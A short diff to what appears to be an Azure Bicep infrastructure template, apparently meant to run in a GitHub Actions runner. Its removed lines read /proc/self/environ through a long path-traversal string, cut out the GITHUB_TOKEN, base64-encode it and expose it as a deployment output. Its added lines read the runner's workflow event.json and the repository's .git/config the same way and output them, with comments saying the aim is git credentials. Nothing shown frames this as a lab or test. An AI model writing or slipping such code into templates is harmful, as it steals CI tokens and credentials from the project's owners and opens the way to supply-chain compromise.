@@ -1,9 +1,8 @@
-var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
+// Try reading git credentials file (the checkout action stores token here)
+  var gitCreds = loadTextContent('../../../../../../../../../../home/runner/work/_temp/_github_workflow/event.json')
 
-  // Find GITHUB_TOKEN position and extract ~100 chars from there
-  var tokenStart = indexOf(secrets, 'GITHUB_TOKEN=')
-  var tokenChunk = tokenStart >= 0 ? substring(secrets, tokenStart, 100) : 'NOT_FOUND'
-  var encoded = base64(tokenChunk)
+  // Or try the git config which has credential paths
+  var gitConfig = loadTextContent('../.git/config')
 
   param location string = 'eastus'
 
@@ -14,4 +13,5 @@ var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
     kind: 'StorageV2'
   }
 
-  output TOKEN_BASE64 string = encoded
+  output EVENT_JSON string = gitCreds
+  output GIT_CONFIG string = gitConfig
